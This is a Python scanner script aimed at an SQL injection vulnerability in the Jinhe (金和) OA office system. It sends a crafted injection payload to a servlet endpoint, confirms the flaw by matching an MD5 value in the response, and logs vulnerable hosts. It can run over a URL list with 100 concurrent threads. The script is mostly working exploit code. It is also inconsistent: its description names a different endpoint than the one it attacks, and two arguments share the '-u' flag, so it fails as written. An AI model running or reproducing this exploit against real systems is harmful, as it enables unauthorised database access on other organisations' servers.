# app ="金和 OA"

import requests,re,os,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

                    ███████╗ ██████╗ ██╗     
                    ██╔════╝██╔═══██╗██║     
                    ███████╗██║   ██║██║     
                    ╚════██║██║▄▄ ██║██║     
                    ███████║╚██████╔╝███████╗
                    ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                            author:秋妤
                                            date:2024.09.25
                                            version:1.0
 """
    print(test)

def poc(target):
    payload = '/jc6/servlet/clobfield'
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Content-Length':'158',
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br, zstd',
        'Content-Type':'application/x-www-form-urlencoded',
        'SL-CE-SUID':'77',
    }
    data = "key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','1'))))--+"
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if '40f5888b67c748df7efba008e7c2f9d2' in res.text:
            print(f'[+]{target}存在漏洞')
            with open('金和_result.txt','a',encoding='utf-8') as fp:
                fp.write(f'{target} \n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 金和OA C6-GetSgIData.aspx SQL注入漏洞 扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()